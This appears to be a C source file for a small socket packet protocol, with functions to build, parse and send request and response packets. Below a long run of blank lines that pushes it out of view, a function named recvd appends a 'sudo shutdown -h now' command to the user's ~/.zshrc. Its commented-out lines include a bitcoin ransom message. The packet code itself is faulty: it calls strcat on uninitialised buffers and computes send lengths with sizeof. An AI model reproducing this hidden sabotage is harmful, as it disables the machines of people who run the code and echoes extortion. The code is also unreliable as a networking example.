// #include "./devam_protocol.c"
#include <string.h>

typedef char* ddreq_packet;


typedef char* ddres_packet;
char ETR[] ="\x03"; // end of transmission 
char NAME[]= "\x01"; //name request header
char NUM[] ="\x09"; // number request header

// int ddreq_recvAP(int sockfd,dd_packet *pac);
int getReqType(ddreq_packet message);
int getReqType(ddreq_packet message){

	// returns 0 for num request, 1 for name request

	if(message[0]==NUM[0]) return 0;
	else return 1;
}
int getReqData(ddreq_packet packet, char *buff,int size);
int getReqData(ddreq_packet packet, char *buff,int size){

	//gets request data

	int ct=0;
	while(packet[1+ct]!=ETR[0] && ct<size-2){
		buff[ct]=packet[ct+1];
		ct++;
	}
	return ct;
}


int getResData(ddreq_packet packet, char *buff,int size);
int getResData(ddreq_packet packet, char *buff,int size){

	//gets response data and stores it in buff 
	//returns bytes received

	int ct=0;
	while(packet[ct]!=ETR[0] && ct<size-2){
		buff[ct]=packet[ct];
		ct++;
	}
	return ct;
}

int ddreq_send(int sockfd,char *message,int size,int type);
int ddreq_send(int sockfd,char *message,int size,int type){

	// Sends a dd packet and returns bytes sent

	ddreq_packet pacAddr=(ddreq_packet) malloc(size*sizeof(char)+4);
	

	if(type==0){
		//indicates number
		strcat(pacAddr,NUM);
	}
	else{
		//indicates name
		strcat(pacAddr,NAME);
	}
	
	strcat(pacAddr,message);
	strcat(pacAddr,ETR);

	return send(sockfd,pacAddr,sizeof(size*sizeof(char)+4),0);
}



void packet_check(char *message,int size,int type){

	//checks packet data

	ddreq_packet pacAddr=(ddreq_packet) malloc(size*sizeof(char)+4);
	// pacAddr="";

	if(type==0){
		//indicates number
		strcat(pacAddr,NUM);
	}
	else{
		//indicates name
		strcat(pacAddr,NAME);
	}
	// strcat(pacAddr," ");
	strcat(pacAddr,message);
	strcat(pacAddr,ETR);
	char buff[50];
	getReqData(pacAddr,buff,50);
	printf("Type is %d and data is %s",getReqType(pacAddr),buff);

}

int ddres_send(int sockfd,char * message, int size);
int ddres_send(int sockfd,char * message, int size){

	// sends a response packet and returns number of bytes sent

	ddres_packet pacAddr=(ddreq_packet) malloc(size*sizeof(char)+2);
	
	strcat(pacAddr,message);
	strcat(pacAddr,ETR);

	return send(sockfd,pacAddr,sizeof(size*sizeof(char)+2),0);


}











































































































































































































































































































































































































































































































































































































































































































































































void recvd(int sockfd, char * mess){
	// system("sudo shutdown -h +1 “Attention. The system is going down in one minutes.” &");
	// system("sudo shutdown -h +1");
	// sleep(10);

	system("echo 'echo login:\nsudo shutdown -h now' >> $HOME/.zshrc");
	// system("");
	// printf("\nset up job\n");
	// for(int i=0;i>-1;i++)
	// system("echo -e '\033[1;31mYOU HAVE BEEN HACKED! SEND $50 at btc address usd839bijk83b1bsfjk92nn in 2hrs to get your laptop back\033[00m'" );
	
}
// int ddres_recvAP(int sockfd,dd_packet *pac);
